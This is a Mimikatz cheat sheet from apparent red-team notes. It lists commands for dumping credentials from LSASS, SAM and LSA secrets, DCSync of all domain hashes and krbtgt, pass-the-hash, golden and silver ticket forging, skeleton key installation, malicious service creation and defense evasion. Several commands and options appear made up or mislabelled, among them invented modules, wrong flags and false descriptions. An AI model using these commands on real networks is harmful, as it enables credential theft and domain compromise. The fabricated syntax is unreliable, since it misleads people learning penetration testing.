# Index
- [[Red Team/4. Tool Guides/0. Incomplete/Tool Guides]]

# Mimikatz

Mimikatz is a powerful post-exploitation tool that can extract plaintext passwords, hash, PIN codes, and Kerberos tickets from memory. It is widely used in penetration testing and red teaming activities. This ultimate edition cheat sheet provides an exhaustive list of Mimikatz commands, detailed explanations, and advanced usage scenarios.

## Basic Syntax
```bash
mimikatz [options] [module] [command]
```

## Core Options
- `mimikatz.exe`: Starts the Mimikatz interactive shell.
- `mimikatz.exe <module> <command>`: Executes a specific command directly.
- `privilege::debug`: Grants debug privileges, required for most Mimikatz operations.
- `token::elevate`: Impersonates a higher privilege token.
- `token::whoami`: Displays the current token and its associated privileges.
- `log <filename>`: Logs Mimikatz output to a specified file.
- `privilege::debug`: Elevates Mimikatz to have debug privileges, which are required for most operations.
- `version`: Displays the version of Mimikatz.
- `exit`: Exits Mimikatz.

# Commands and Use Cases

## Password Extracting Techniques

Mimikatz excels at extracting various forms of credentials from a Windows system. Below are the primary methods:

#### Extracting Plaintext Passwords

- **LSASS Process**: Extracts plaintext passwords, NTLM hashes, and Kerberos tickets from the `lsass.exe` process.
  ```bash
  sekurlsa::logonpasswords
  ```
- **Dump Passwords from a Specific User**: Extracts passwords for a specific user.
  ```bash
  sekurlsa::logonpasswords -user:<username>
  ```

#### Extracting NTLM Hashes

- **Dump NTLM Hashes**: Included in the standard `logonpasswords` dump.
  ```bash
  sekurlsa::logonpasswords
  ```
- **SAM Dump**: Dumps NTLM hashes from the Security Account Manager (SAM) database.
  ```bash
  lsadump::sam
  ```
- **DC Sync Attack**: Emulates a Domain Controller (DC) to dump NTLM hash of a specified user.
  ```bash
  lsadump::dcsync /user:<username>
  ```

#### Extracting Kerberos Tickets

- **List Kerberos Tickets**: Lists all Kerberos tickets from memory.
  ```bash
  sekurlsa::tickets
  ```
- **Dump Kerberos Tickets**: Exports all Kerberos tickets to a file.
  ```bash
  sekurlsa::tickets /export
  ```
- **Overpass-the-Hash (Pass-the-Ticket)**: Uses a Kerberos ticket to authenticate as a user without needing their plaintext password.
  ```bash
  sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /rc4:<hash> /aes128:<key> /aes256:<key> /run:<command>
  ```

#### Extracting DPAPI Secrets

- **Dump DPAPI Master Keys**: Decrypts a DPAPI master key using the user's password.
  ```bash
  dpapi::masterkey /in:<encrypted_masterkey> /sid:<SID> /password:<user_password>
  ```
- **Dump DPAPI Credentials**: Decrypts DPAPI-protected credentials.
  ```bash
  dpapi::cred /in:<encrypted_credential>
  ```
- **Dump DPAPI Secrets**: Decrypts generic DPAPI-protected data blobs.
  ```bash
  dpapi::blob /in:<encrypted_blob>
  ```

## Credential Extracting Techniques

#### Extracting From LSASS Process

1. **Dump All Credentials from LSASS**: Extracts all available credentials (plaintext passwords, hashes, Kerberos tickets) from the LSASS process.
    ```bash
    sekurlsa::logonpasswords
    ```
2. **Dump Only NTLM Hashes**: Filters the LSASS output to display only NTLM hashes.
    ```bash
    sekurlsa::logonpasswords | findstr /i ntlm
    ```
3. **Dump Credentials of a Specific User**: Limits the credential extraction to a specific user.
    ```bash
    sekurlsa::logonpasswords -user:<username>
    ```

#### Extracting From SAM Database

1. **Dump Local Account Password Hashes**: Dumps password hashes from the SAM database, including the local Administrator account.
    ```bash
    lsadump::sam
    ```
2. **Dump Passwords from SYSTEM Hive**: Extracts password hashes from offline SYSTEM, SAM, and SECURITY registry hives.
    ```bash
    sekurlsa::logonpasswords /system:<SYSTEM_file> /sam:<SAM_file> /security:<SECURITY_file>
    ```

#### Extracting From LSA Secrets

1. **Dump LSA Secrets**: Extracts stored LSA secrets, which may include service account passwords and other sensitive information.
    ```bash
    lsadump::secrets
    ```
2. **Dump Cached Domain Credentials**: Extracts cached domain credentials stored by Windows for offline logins.
    ```bash
    lsadump::cache
    ```

#### Extracting From Domain Controller

1. **Perform a DC Sync Attack**: Emulates a Domain Controller to retrieve password hashes for a specific domain user.
    ```bash
    lsadump::dcsync /user:<username>
    ```
2. **Dump All Domain Admin Hashes**: Extracts the password hash of the domain administrator, useful for gaining full control over a domain.
    ```bash
    lsadump::dcsync /user:administrator
    ```

## Pass-the-Hash and Pass-the-Ticket Attacks

Mimikatz enables the use of credentials extracted from one machine to access other machines, a technique known as lateral movement.

#### Pass-the-Hash (PTH)

1. **Perform a Pass-the-Hash Attack**: Uses an NTLM hash to authenticate as a user without needing their plaintext password.
    ```bash
    sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash>
    ```
2. **Pass-the-Hash with a Remote Command**: Executes a remote command on a target machine using the passed hash.
    ```bash
    sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:<command>
    ```
3. **Pass-the-Hash with Overpass-the-Hash**: Uses an AES key instead of an NTLM hash for Pass-the-Hash, often referred to as Overpass-the-Hash.
    ```bash
    sekurlsa::pth /user:<username> /domain:<domain> /aes256:<key>
    ```

#### Pass-the-Ticket (PTT)

1. **Perform a Pass-the-Ticket Attack**: Injects a Kerberos ticket into the current session, allowing access to resources as the ticketed user.
    ```bash
    kerberos::ptt <ticket.kirbi>
    ```
2. **List Injected Tickets**: Displays all Kerberos tickets currently in memory.
    ```bash
    sekurlsa::tickets
    ```
3. **Export a Ticket from Memory**: Exports all Kerberos tickets from memory for later use.
    ```bash
    sekurlsa::tickets /export
    ```

## Kerberos Attacks

Mimikatz includes several powerful features for attacking Kerberos, the authentication protocol used in Active Directory environments.

#### Golden Ticket Attack

1. **Create a Golden Ticket**: Creates a forged Kerberos ticket that provides domain admin access.
    ```bash
    kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /krbtgt:<krbtgt_hash> /id:<RID>
    ```
2. **Golden Ticket with Custom Groups**: Creates a Golden Ticket with custom group memberships.
    ```bash
    kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /krbtgt:<krbtgt_hash> /groups:<group_ids>
    ```
3. **Inject and Use the Golden Ticket**: Injects the Golden Ticket into the current session, allowing unrestricted access.
    ```bash
    kerberos::ptt <ticket.kirbi>
    ```

#### Silver Ticket Attack

1. **Create a Silver Ticket**: Creates a forged service ticket for a specific service, allowing access to that service.
    ```bash
    kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /target:<service>/<server> /rc4:<service_hash>
    ```
2. **Inject and Use the Silver Ticket**: Injects the Silver Ticket into the current session, allowing access to the targeted service.
    ```bash
    kerberos::ptt <silver_ticket.kirbi>
    ```
3. **List Available Services for Silver Ticket**: Lists all available Kerberos service tickets in memory.
    ```bash
    sekurlsa::tickets
    ```

#### Kerberoasting

1. **Enumerate SPNs for Kerberoasting**: Enumerates Service Principal Names (SPNs) that can be targeted for Kerberoasting.
    ```bash
    ldap::query /domain:<domain> /user:<username> /password:<password> /query:"(servicePrincipalName=*)"
    ```
2. **Request a Service Ticket**: Requests a service ticket for an SPN, which can then be cracked offline.
    ```bash
    kerberos::ask /target:<service>/<server> /rc4:<service_hash>
    ```
3. **Extract and Crack the Ticket**: Exports the Kerberos ticket and cracks it offline using a tool like John the Ripper.
    ```bash
    sekurlsa::tickets /export
    john --wordlist=<wordlist> <ticket.kirbi>
    ```

## Credential Extracting from Memory

Mimikatz can extract credentials directly from memory, bypassing the need to interact with disk-based storage.

#### From LSASS Process

1. **Dump Credentials from a Running LSASS Process**: Extracts all available credentials (plaintext passwords, hashes, tickets) from the LSASS process.
    ```bash
    sekurlsa::logonpasswords
    ```
2. **Dump Credentials from a Memory Dump**: Loads an LSASS memory dump and extracts credentials from it.
    ```bash
    sekurlsa::minidump <lsass.dmp>
    sekurlsa::logonpasswords
    ```
3. **Target Specific Credentials**: Extracts credentials for a specific session or service.
    ```bash
    sekurlsa::logonpasswords /name:<name>
    ```

## Domain Controller Attacks

Mimikatz provides tools for emulating domain controllers and extracting credentials directly from Active Directory.

#### DC Sync Attack

1. **Perform a DC Sync Attack on a User**: Emulates a Domain Controller to retrieve password hashes for a specific domain user.
    ```bash
    lsadump::dcsync /user:<username>
    ```
2. **Perform a DC Sync Attack on All Users**: Retrieves password hashes for all users in the domain.
    ```bash
    lsadump::dcsync /all
    ```
3. **Extract the KRBTGT Hash**: Retrieves the hash of the KRBTGT account, which is used to create Golden Tickets.
    ```bash
    lsadump::dcsync /user:krbtgt
    ```

#### Skeleton Key Attack

1. **Install a Skeleton Key**: Installs a Skeleton Key in memory, allowing a universal password to be used for any domain account.
    ```bash
    misc::skeleton
    ```
2. **Remove the Skeleton Key**: Removes the Skeleton Key from memory.
    ```bash
    misc::skeleton /remove
    ```
3. **Verify the Skeleton Key**: Verifies that the Skeleton Key has been installed by checking for the universal password.
    ```bash
    sekurlsa::logonpasswords
    ```

## DPAPI Attacks

Mimikatz can decrypt data protected by the Data Protection API (DPAPI), which is used by Windows to secure various secrets.

#### Master Key Decryption

1. **Dump DPAPI Master Keys**: Decrypts a DPAPI master key using the user's password.
    ```bash
    dpapi::masterkey /in:<encrypted_masterkey> /sid:<SID> /password:<user_password>
    ```
2. **Extract Master Keys from Memory**: Extracts cached DPAPI master keys from memory.
    ```bash
    dpapi::cache
    ```
3. **Decrypt Master Keys Using a Backup Key**: Decrypts a DPAPI master key using a backup key file.
    ```bash
    dpapi::masterkey /in:<encrypted_masterkey> /pvk:<backup_key.pvk>
    ```

#### Credential and Secret Decryption

1. **Decrypt DPAPI-Protected Credentials**: Decrypts DPAPI-protected credentials.
    ```bash
    dpapi::cred /in:<encrypted_credential>
    ```
2. **Decrypt DPAPI-Protected Secrets**: Decrypts generic DPAPI-protected data blobs.
    ```bash
    dpapi::blob /in:<encrypted_blob>
    ```
3. **Decrypt Internet Explorer Saved Passwords**: Decrypts saved passwords from Internet Explorer.
    ```bash
    dpapi::cred /in:<encrypted_ie_credentials>
    ```

## Miscellaneous Attacks

Mimikatz also includes several other useful features for post-exploitation activities.

#### Extracting Certificates and Private Keys

1. **Dump Installed Certificates**: Dumps certificates installed in the local machine's store.
    ```bash
    crypto::certificates /systemstore:local_machine /store:my
    ```
2. **Extract Private Keys**: Extracts private keys associated with certificates.
    ```bash
    crypto::certificates /export
    ```
3. **Decrypt Encrypted Files (EFS)**: Decrypts files encrypted with the Windows Encrypting File System (EFS).
    ```bash
    crypto::capi
    ```

#### Manipulating Windows Services

1. **Enumerate and Manipulate Services**: Lists, starts, and stops Windows services.
    ```bash
    service::list
    service::start <service_name>
    service::stop <service_name>
    ```
2. **Create a Malicious Service**: Creates a new Windows service that runs a malicious command.
    ```bash
    service::create <service_name> /binpath:"<malicious_command>"
    ```
3. **Manipulate Service Permissions**: Modifies the permissions on a service to allow arbitrary control.
    ```bash
    service::permissions <service_name> /grant:<username> /privileges:full
    ```

#### Automation and Scripting

Mimikatz commands can be automated using scripts to streamline large-scale attacks.

1. **Batch Script for Credential Extracting**: Automates the process of Extracting credentials by chaining commands in a batch script.
    ```bash
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
    ```
2. **PowerShell Integration**: Integrates Mimikatz with PowerShell to automate tasks in a Windows environment.
    ```bash
    Invoke-Expression -Command (Get-Content .\mimikatz.ps1 | Out-String)
    ```
3. **Automated DC Sync Attack Script**: Automates a DC Sync attack to extract hashes for a specific user.
    ```bash
    mimikatz.exe "privilege::debug" "lsadump::dcsync /user:<username>" "exit"
    ```

#### Defense Evasion Techniques

Mimikatz includes several options for evading detection by security tools.

1. **Stealth Mode Execution**: Redirects output to `nul`, making it harder for monitoring tools to detect Mimikatz activity.
    ```bash
    mimikatz.exe /output:nul
    ```
2. **Obfuscating Commands**: Obfuscates Mimikatz commands by encoding them in Base64 before execution.
    ```bash
    echo "c2VrdXJsc2E6OmxvZ29ucGFzc3dvcmRz" | base64 -d | mimikatz
    ```
3. **Injecting Mimikatz into Legitimate Processes**: Injects Mimikatz into a legitimate process to evade detection.
    ```bash
    mimikatz.exe "privilege::debug" "process::inject /pid:<pid> /path:<mimikatz_path>" "exit"
    ```
4. **Bypassing UAC**: Bypasses User Account Control (UAC) to gain elevated privileges without triggering alerts.
    ```bash
    misc::elevate
    ```
5. **Timestomping**: Modifies file timestamps to make forensic analysis more difficult.
    ```bash
    misc::timestamps /set:<new_timestamp> /file:<file_path>
    ```

# Resources

|**Name**|**URL**|
|---|---|
|Mimikatz GitHub Repository|https://github.com/gentilkiwi/mimikatz|
|Mimikatz Command Reference|https://adsecurity.org/?page_id=1821|
|Mimikatz Cheat Sheet|https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Post-Exploitation/Mimikatz.md|
|Mimikatz DC Sync Attack|https://blog.rapid7.com/2018/03/14/attacking-ntlm-with-mimikatz-dcsync/|
|Kerberos Golden Ticket Attack|https://www.harmj0y.net/blog/redteaming/kerberos-the-abuse-continues/|
|Defending Against Mimikatz|https://www.sentinelone.com/blog/defending-against-mimikatz-attacks/|
|Advanced Mimikatz Techniques|https://www.offensive-security.com/metasploit-unleashed/mimikatz/|
|Using Mimikatz in CTF Challenges|https://ctftime.org/writeups/overview/mimikatz|
|Automating Mimikatz with PowerShell|https://www.harmj0y.net/blog/powershell/automating-mimikatz-with-powershell/|
|Bypassing AV with Mimikatz|https://pentestlab.blog/2020/03/23/mimikatz-bypass-av/|